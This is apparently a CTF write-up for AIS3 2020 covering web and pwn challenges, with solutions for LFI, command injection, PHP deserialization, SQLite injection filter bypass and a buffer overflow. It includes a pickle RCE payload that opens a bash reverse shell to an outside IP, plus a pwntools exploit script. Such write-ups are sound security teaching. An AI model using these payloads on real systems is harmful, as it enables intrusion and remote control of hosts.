# AIS3 2020
## Web
### Shark
- 一開始點開，可以發現疑似LFI漏洞的提示
https://shark.ais3.org/?path=hint.txt
- 點開來會告訴你
:::info
Please find the other server in the internal network! (flag is on that server)

    GET http://some-internal-server/flag
:::
- 基本上就跟AIS3 2019 d33p一模一樣
    - 找相關連線
    https://shark.ais3.org/?path=php://filter/convert.base64-encode/resource=../../../proc/net/fib\_trie
    ```
    Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.22.0.0/16 2 0 2
        +-- 172.22.0.0/30 2 0 2
           |-- 172.22.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.22.0.3
              /32 host LOCAL
        |-- 172.22.255.255
           /32 link BROADCAST
    ```
    - index.php
    ```php
    <?php
    if ($path = @$_GET['path']) {
        if (preg_match('/^(\.|\/)/', $path)) {
            // disallow /path/like/this and ../this
            die('<pre>[forbidden]</pre>');
        }
        $content = @file_get_contents($path, FALSE, NULL, 0, 1000);
        die('<pre>' . ($content ? htmlentities($content) : '[empty]') . '</pre>');
    }
    ?>

    ```
- 最後payload
    - https://shark.ais3.org/?path=php://filter/convert.base64-encode/resource=http://172.22.0.2/flag
- flag: AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}

### Squirrel
- 點開後發現有api.php把/etc/passwd讀出來
- 先想辦法拿source code會比較有方向
- https://squirrel.ais3.org/api.php?get=/var/www/html/api.php
```php
<?php
if ($file = @$_GET['get']) {
    $output = shell_exec(\"cat '$file'\");

    if ($output !== null) {
        echo json_encode(['output' => $output]);
    } 
?>
```
- command injection

### Elephant
- 看到網頁原始碼提示說要看Source code
    - 發現有.git/資料夾
```
<?php

const SESSION = 'elephant_user';
$flag = file_get_contents('/flag');


class User {
    public $name;
    private $token;

    function __construct($name) {
        $this->name = $name;
        $this->token = md5($_SERVER['REMOTE_ADDR'] . rand());
    }

    function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
}

if (isset($_GET['logout'])) {
    header('Location: /');
    setcookie(SESSION, NULL, 0);
    exit;
}


$user = NULL;

if ($name = $_POST['name']) {
    $user = new User($name);
    header('Location: /');
    setcookie(SESSION, base64_encode(serialize($user)), time() + 600);
    exit;
} else if ($data = @$_COOKIE[SESSION]) {
    $user = unserialize(base64_decode($data));
}



?><!DOCTYPE html>
<head>
    <title>Elephant</title>
    <meta charset='utf-8'>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>
    <?php if (!$user): ?>
        <div id="login">
            <h3 class="text-center text-white pt-5">Are you familiar with PHP?</h3>
            <div class="container">
                <div id="login-row" class="row justify-content-center align-items-center">
                    <div id="login-column" class="col-md-6">
                        <div id="login-box" class="col-md-12">
                            <form id="login-form" class="form" action="" method="post">
                                <h3 class="text-center text-info">What's your name!?</h3>
                                <div class="form-group">
                                    <label for="name" class="text-info">Name:</label><br>
                                    <input type="text" name="name" id="name" class="form-control">
                                </div>
                                <div class="form-group">
                                    <input type="submit" name="submit" class="btn btn-info btn-md" value="let me in">
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    <?php else: ?>
        <h3 class="text-center text-white pt-5">You may want to read the source code.</h3>
        <div class="container" style="text-align: center">
            <img src="images/elephant2.png">
        </div>
        <hr>
        <div class="container">
            <div class="row justify-content-center align-items-center">
                <div class="col-md-6">
                    <div class="col-md-12">
                        <h3 class="text-center text-info">Do you know?</h3>
                        <h3 class="text-center text-info">PHP's mascot is an elephant!</h3>
                        Hello, <b><?= $user->name ?></b>!
                        <?php if ($user->canReadFlag()): ?>
                            This is your flag: <b><?= $flag ?></b>
                        <?php else: ?>
                            Your token is not sufficient to read the flag!
                        <?php endif; ?>
                        <a href="?logout">Logout!</a>
                    </div>
                </div>
            </div>
        </div>
    <?php endif ?>
</body>

```
- 可以發現strcmp比較有漏洞，應為===
    - Null == string -> True
- 特別注意必須要base64encode，因為會有not printable ASCII
    - private會加上\x00類似字元修飾
- payload
```php
<?php
class User {
    public $name;
    private $token;

    function __construct($name) {
        $this->name = $name;
        $this->token = NULL;
    }

    function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
}

	$another = new User('admin');
	$data = serialize($another);
	echo base64_encode(serialize($another));
?>
```

### Snake
- source code
```
from flask import Flask, Response, request
import pickle, base64, traceback

Response.default_mimetype = 'text/plain'

app = Flask(__name__)

@app.route("/")
def index():
    data = request.values.get('data')
    
    if data is not None:
        try:
            data = base64.b64decode(data)
            data = pickle.loads(data)
            
            if data and not data:
                return open('/flag').read()

            return str(data)
        except:
            return traceback.format_exc()
        
    return open(__file__).read()
```
- pickle.load會執行data裡面的內容
    - 直接RCE
- payload
```
import os
import pickle
import sys
import base64

payload = 'bash -c \'bash -i >& /dev/tcp/140.113.87.19/4444 0>&1\''

class Exploit(object):
    def __reduce__(self):
        return (os.system, (payload,))

shellcode = pickle.dumps(Exploit())
result = base64.b64encode(shellcode).decode()
```
- flag: AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}

### Owl
- SQLite injection
- admin:admin登入可以拿到source code
- Source code
```
<?php

    if (isset($_GET['source'])) {
        highlight_file(__FILE__);
        exit;
    }

    // Settings
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    date_default_timezone_set('Asia/Taipei');
    session_start();

    // CSRF
    if (!isset($_SESSION['csrf_key']))
        $_SESSION['csrf_key'] = md5(rand() * rand());
    require_once('csrf.php');
    $csrf = new Csrf($_SESSION['csrf_key']);


    if ($action = @$_GET['action']) {
        function redirect($path = '/', $message = null) {
            $alert = $message ? 'alert(' . json_encode($message) . ')' : '';
            $path = json_encode($path);
            die("<script>$alert; document.location.replace($path);</script>");
        }

        if ($action === 'logout') {
            unset($_SESSION['user']);
            redirect('/');
        }
        else if ($action === 'login') {
            // Validate CSRF token
            $token = @$_POST['csrf_token'];
            if (!$token || !$csrf->validate($token)) {
                redirect('/', 'invalid csrf_token');
            }

            // Check if username and password are given
            $username = @$_POST['username'];
            $password = @$_POST['password'];
            if (!$username || !$password) {
                redirect('/', 'username and password should not be empty');
            }

            // Get rid of sqlmap kiddies
            if (stripos($_SERVER['HTTP_USER_AGENT'], 'sqlmap') !== false) {
                redirect('/', "sqlmap is child's play");
            }

            // Get rid of you
            $bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--'];
            $username = str_ireplace($bad, '', $username);
            $username = str_ireplace($bad, '', $username);

            // Auth
            $hash = md5($password);
            $row = (new SQLite3('/db.sqlite3'))
                ->querySingle("SELECT * FROM users WHERE username = '$username' AND password = '$hash'", true);
            if (!$row) {
                redirect('/', 'login failed');
            }

            $_SESSION['user'] = $row['username'];
            redirect('/');
        }
        else {
            redirect('/', "unknown action: $action");
        }
    }

    $user = @$_SESSION['user'];

?><!DOCTYPE html>
<head>
    <title>🦉🦉🦉🦉</title>
    <meta charset='utf-8'>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>
    <?php if (!$user): ?>
        <div id="login">
            <h3 class="text-center text-white pt-5">GUESS THE STUPID USERNAME / PASSWORD</h3>
            <div class="container">
                <div id="login-row" class="row justify-content-center align-items-center">
                    <div id="login-column" class="col-md-6">
                        <div id="login-box" class="col-md-12">
                            <form id="login-form" class="form" action="?action=login" method="post">
                                <input type="hidden" name="csrf_token" value="<?= htmlentities($csrf->generate()) ?>">
                                <h3 class="text-center text-info">🦉: "Login to see cool things!"</h3>
                                <div class="form-group">
                                    <label for="name" class="text-info">Username:</label><br>
                                    <input type="text" name="username" id="username" class="form-control"><br>
                                    <label for="name" class="text-info">Password:</label><br>
                                    <input type="text" name="password" id="password" class="form-control"><br>
                                </div>
                                <div class="form-group">
                                    <input type="submit" name="submit" class="btn btn-info btn-md" value="Login">
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    <?php else: ?>
        <h3 class="text-center text-white pt-5"><a style="color: white" href="/?source">SHOW HINT</a></h3>
        <div class="container">
            <div class="row justify-content-center align-items-center">
                <div class="col-md-6">
                    <div class="col-md-12">
                        <h3 class="text-center text-info">Nothing</h3>
                        Hello, <b><?= htmlentities($user) ?></b>, nothing here.
                        <a href="?action=logout">Logout!</a>
                    </div>
                </div>
            </div>
        </div>
    <?php endif ?>
</body>
```
- space: 0A 0D 0C 09 20
- bypass /**/: %0b

## Crypto
### 

## Reverse

```
 L.  52      1430  LOAD_NAME                print
             1432  LOAD_NAME                flag
             1434  CALL_FUNCTION_1       1  ''
             1436  POP_TOP          
             1438  JUMP_FORWARD       1448  'to 1448'
           1440_0  COME_FROM           866  '866'
```

## Pwn
### BOF
- main的標籤被拿掉了，但基本上水題不會刁難你的
```
main:
  4006fb:	55                   	push   rbp
  4006fc:	48 89 e5             	mov    rbp,rsp
  4006ff:	48 83 ec 30          	sub    rsp,0x30
  400703:	b8 00 00 00 00       	mov    eax,0x0
  400708:	e8 8d ff ff ff       	call   40069a <setvbuf@plt+0x10a>
  40070d:	48 8d 3d bc 00 00 00 	lea    rdi,[rip+0xbc]  # 4007d0 <setvbuf@plt+0x240>
  400714:	e8 47 fe ff ff       	call   400560 <puts@plt>
  400719:	48 8d 45 d0          	lea    rax,[rbp-0x30]
  40071d:	48 89 c7             	mov    rdi,rax
  400720:	b8 00 00 00 00       	mov    eax,0x0
  400725:	e8 56 fe ff ff       	call   400580 <gets@plt>
  40072a:	b8 00 00 00 00       	mov    eax,0x0
  40072f:	c9                   	leave  
  400730:	c3                   	ret    

win:
  400687:	55                   	push   rbp
  400688:	48 89 e5             	mov    rbp,rsp
  40068b:	48 8d 3d 36 01 00 00 	lea    rdi,[rip+0x136]        # 4007c8 <setvbuf@plt+0x238>
  400692:	e8 d9 fe ff ff       	call   400570 <system@plt>
  400697:	90                   	nop
  400698:	5d                   	pop    rbp
  400699:	c3                   	ret  
```
- script
```python
from pwn import *

p = remote('60.250.197.227', 10000)
#p = process('./bof')

pause()

p.recvuntil('They said there need some easy challenges, Okay here is your bof, but you should notice something in ubuntu 18.04.')

address = 0x40068b

payload = b'A' * 56 + p64(address)

p.sendline(payload)
p.interactive()

```
- flag: AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}


### Nonsense
- checksec
    - 全關
- 原本的machine code
```
check: 
  400698: 55                    push   rbp
  400699: 48 89 e5              mov    rbp,rsp
  40069c: c7 45 f4 00 00 00 00  mov    n, 0x0
  4006a3: eb 79                 jmp    40071e 

  4006a5: 8b 45 f4              mov    eax,n
  4006a8: 48 63 d0              movsxd rdx,eax
  4006ab: 48 8d 05 ee 09 20 00  lea    rax, 6010a0 
  4006b2: 0f b6 04 02           movzx  eax,BYTE PTR [rdx+rax*1]
  4006b6: 3c 1f                 cmp    al,0x1f
  4006b8: 7f 07                 jg     4006c1

  4006ba: b8 00 00 00 00        mov    eax,0x0
  4006bf: eb 68                 jmp    400729 

  4006c1: c7 45 f8 01 00 00 00  mov    option, True
  4006c8: c7 45 fc 00 00 00 00  mov    length,0x0
  4006cf: eb 36                 jmp    400707 

  4006d1: 8b 55 f4              mov    edx,n
  4006d4: 8b 45 fc              mov    eax,length
  4006d7: 01 d0                 add    eax,edx
  4006d9: 48 63 d0              movsxd rdx,eax
  4006dc: 48 8d 05 bd 09 20 00  lea    rax, 6010a0 
  4006e3: 0f b6 0c 02           movzx  ecx,BYTE PTR [rdx+rax*1]
  4006e7: 8b 45 fc              mov    eax,length
  4006ea: 48 63 d0              movsxd rdx,eax
  4006ed: 48 8d 05 4c 09 20 00  lea    rax, "wubba lubba dub dub "
  4006f4: 0f b6 04 02           movzx  eax,BYTE PTR [rdx+rax*1]
  4006f8: 38 c1                 cmp    cl,al
  4006fa: 74 07                 je     400703 
  4006fc: c7 45 f8 00 00 00 00  mov    option, False

  400703: 83 45 fc 01           add    length,0x1
  400707: 83 7d fc 0f           cmp    DWORD length,0xf
  40070b: 7e c4                 jle    4006d1 
  40070d: 83 7d f8 00           cmp    option, False
  400711: 74 07                 je     40071a 

  400713: b8 01 00 00 00        mov    eax,0x1
  400718: eb 0f                 jmp    400729 

  40071a: 83 45 f4 01           add    n,0x1
  40071e: 83 7d f4 5f           cmp    n,0x5f
  400722: 7e 81                 jle    4006a5 
  400724: b8 00 00 00 00        mov    eax,0x0
  400729: 5d                    pop    rbp
  40072a: c3                    ret    

main:
  40072b:	55                   	push   rbp
  40072c:	48 89 e5             	mov    rbp,rsp
  40072f:	b8 00 00 00 00       	mov    eax,0x0
  400734:	e8 fe fe ff ff       	call   400637 
  400739:	48 8d 3d 18 01 00 00 	lea    rdi,[rip+0x118]  "Welcome to Rick and Morty's crazy world." 
  400740:	e8 db fd ff ff       	call   400520 <puts@plt>
  400745:	48 8d 3d 35 01 00 00 	lea    rdi,[rip+0x135]  "What's your name?" 
  40074c:	e8 cf fd ff ff       	call   400520 <puts@plt>
  400751:	ba 10 00 00 00       	mov    edx,0x10
  400756:	48 8d 35 a3 09 20 00 	lea    rsi,[rip+0x2009a3] # 601100 
  40075d:	bf 00 00 00 00       	mov    edi,0x0
  400762:	e8 c9 fd ff ff       	call   400530 <read@plt> 

  read(0, 0x601100, 0x10)

  400767:	48 8d 3d 2a 01 00 00 	lea    rdi,[rip+0x12a] "Rick's stupid nonsense catchphrase is \"wubba lubba dub dub\"." 

  40076e:	e8 ad fd ff ff       	call   400520 <puts@plt>
  400773:	48 8d 3d 5b 01 00 00 	lea    rdi,[rip+0x15b] "What's yours?" 
  40077a:	e8 a1 fd ff ff       	call   400520 <puts@plt>
  40077f:	ba 60 00 00 00       	mov    edx,0x60
  400784:	48 8d 35 15 09 20 00 	lea    rsi,[rip+0x200915] # 6010a0 
  40078b:	bf 00 00 00 00       	mov    edi,0x0
  400790:	e8 9b fd ff ff       	call   400530 <read@plt>

  read(0, 0x6010a0, 0x60)

  400795:	b8 00 00 00 00       	mov    eax,0x0
  40079a:	e8 f9 fe ff ff       	call   check 

  40079f:	85 c0                	test   eax,eax
  4007a1:	74 10                	je     4007b3 

  4007a3:	48 8d 15 f6 08 20 00 	lea    rdx,[rip+0x2008f6] # 6010a0 
  4007aa:	b8 00 00 00 00       	mov    eax,0x0
  4007af:	ff d2                	call   rdx
  4007b1:	eb 0c                	jmp    4007bf 

  4007b3:	48 8d 3d 2e 01 00 00 	lea    rdi,[rip+0x12e] "Ummm, that's totally nonsense."
  4007ba:	e8 61 fd ff ff       	call   400520 <puts@plt>
  4007bf:	b8 00 00 00 00       	mov    eax,0x0
  4007c4:	5d                   	pop    rbp
  4007c5:	c3                   	ret    
```
- 自己reverse後的結果
```cpp=
char input[0x60];
char answer[] = "wubbalubbadubdub"
for(int i=0; i<0x60; ++i){
  if(input[i] < 0x1f || input[i] > 0x7f){
    return false;
  }
  bool option = true;
  for(int j=0; j<0x10; ++j){
    if(input[i+j]!=answer[j]){
      option = false;
    }
  }
  if(option == true){
    return true;
  }
}
return false;
```

- 程式會檢查輸入的內容，如果含有"wubbalubbadubdub"的字串就會call function
    - call function位置固定為使用者輸入位置
        - 0x6010a0
    - 規定輸入內容值介於0x1f跟0x7f之間
        - 一旦找到wubbalubbadubdub就不會檢查後面內容
- 可以利用這個漏洞誘導去執行shellcode
    - 塞ja誘導call function 到我們塞的shellcode位置
- payload
```
```

- flag: AIS3{Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!}

### portal_gun
- 保護機制
    - NX
    - 其他全關

## Misc
